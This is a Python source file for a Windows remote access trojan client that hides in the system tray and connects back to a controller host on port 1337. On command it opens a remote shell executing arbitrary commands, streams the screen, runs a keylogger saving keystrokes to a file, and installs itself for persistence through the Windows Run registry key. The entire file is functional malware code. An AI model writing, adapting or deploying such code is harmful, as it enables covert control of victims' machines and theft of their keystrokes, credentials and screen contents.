import ctypes
import socket
import time
import os
import subprocess
import tempfile
import sys
import threading
import json
import winreg as reg
from multiprocessing.connection import Listener
from tkinter import simpledialog
from PIL import Image, ImageDraw
import pystray
from pystray import MenuItem, Icon
import pyautogui
import tkinter as tk
from pynput.keyboard import Listener

CONFIG_FILE = 'config.json'
HOST = '192.168.1.11'
PORT = 1337
connection_thread = None
stop_connection = threading.Event()

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2


def create_image(width, height):
    image = Image.new('RGB', (width, height), color=(255, 255, 255))
    dc = ImageDraw.Draw(image)
    dc.rectangle((width // 4, height // 4, width * 3 // 4, height * 3 // 4), fill=(0, 100, 255))
    return image


def connect():
    while not stop_connection.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            sysinfo = socket.gethostbyname(socket.gethostname())
            s.send(sysinfo.encode())
            return s
        except (ConnectionRefusedError, OSError):
            time.sleep(5)
    return None


def client():
    while not stop_connection.is_set():
        s = connect()
        if s is None:
            continue
        handle_client_commands(s)


def handle_client_commands(s):
    while not stop_connection.is_set():
        try:
            data = s.recv(1024).decode()
            if data == "shell":
                handle_shell_commands(s)
            elif data == 'screenshare':
                start_screenshare(s)
            elif data == 'keylogger':
                start_keylogger(s)
            elif data == 'skey':
                stop_keylogger(s)
            elif data == 'install':
                install()
        except (ConnectionResetError, ConnectionAbortedError, OSError):
            break


def handle_shell_commands(s):
    while not stop_connection.is_set():
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8").strip()
        if data == "quit":
            break
        if data.startswith("cd "):
            os.chdir(data[3:])
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_str = proc.communicate()[0].decode("UTF-8") + proc.communicate()[1].decode("UTF-8")
            s.send(str.encode("\n" + output_str))


def start_screenshare(s):
    try:
        from vidstream import ScreenShareClient
        screen = ScreenShareClient(HOST, 8080)
        screen.start_stream()
    except Exception:
        s.send("Impossible to get screen".encode())


def start_keylogger(s):
    global klgr
    klgr = True
    kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ,
                          FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                          None, CREATE_ALWAYS, 0, 0)
    threading.Thread(target=keylogger, daemon=True).start()
    s.send("Keylogger is started".encode())


def stop_keylogger(s):
    global klgr
    klgr = False
    s.send("Keylogger is stopped".encode())


def load_config():
    global HOST, PORT
    try:
        with open(CONFIG_FILE, 'r') as file:
            config = json.load(file)
            HOST = config.get('host', HOST)
            PORT = config.get('port', PORT)
    except (FileNotFoundError, json.JSONDecodeError):
        pass


def save_config():
    with open(CONFIG_FILE, 'w') as file:
        json.dump({'host': HOST, 'port': PORT}, file)


def ask_for_ip_and_port():
    global HOST, PORT
    root = tk.Tk()
    root.withdraw()
    HOST = simpledialog.askstring("Input", "Enter IP address:", parent=root)
    PORT = simpledialog.askinteger("Input", "Enter port number:", parent=root)
    save_config()
    root.destroy()


def on_quit(icon, item):
    stop_connection.set()
    icon.stop()
    exit()


def setup(icon):
    icon.visible = True
    load_config()
    if not HOST or not PORT:
        ask_for_ip_and_port()
    start_connection_thread()


def start_connection_thread():
    global connection_thread
    stop_connection.clear()
    connection_thread = threading.Thread(target=client, daemon=True)
    connection_thread.start()


def change_ip():
    stop_connection.set()
    connection_thread.join()
    threading.Thread(target=ask_for_ip_and_port, daemon=True).start()
    start_connection_thread()


def keylogger():
    def on_press(key):
        if klgr:
            with open('keylogs.txt', 'a') as f:
                f.write(f'{key}\n')

    with Listener(on_press=on_press) as listener:
        listener.join()


def extract_exe():
    embedded_exe_name = 'client.exe'
    temp_dir = tempfile.gettempdir()
    temp_exe_path = os.path.join(temp_dir, embedded_exe_name)

    if not os.path.exists(temp_exe_path):
        with open(temp_exe_path, 'wb') as temp_file:
            temp_file.write(get_resource(embedded_exe_name))

    return temp_exe_path


def get_resource(filename):
    base_path = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(__file__)
    with open(os.path.join(base_path, filename), 'rb') as resource_file:
        return resource_file.read()


def install():
    try:
        install_path = extract_exe()
        key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, 'GUIShell', 0, reg.REG_SZ, install_path)
        reg.CloseKey(reg_key)
        print("Installed successfully!")
    except Exception as e:
        print(f"Failed to install: {e}")


icon = Icon("Tray Icon", create_image(64, 64), "Tray Program", menu=pystray.Menu(
    MenuItem("Change Server IP", change_ip),
    MenuItem("Quit", on_quit)
))

icon.run(setup)
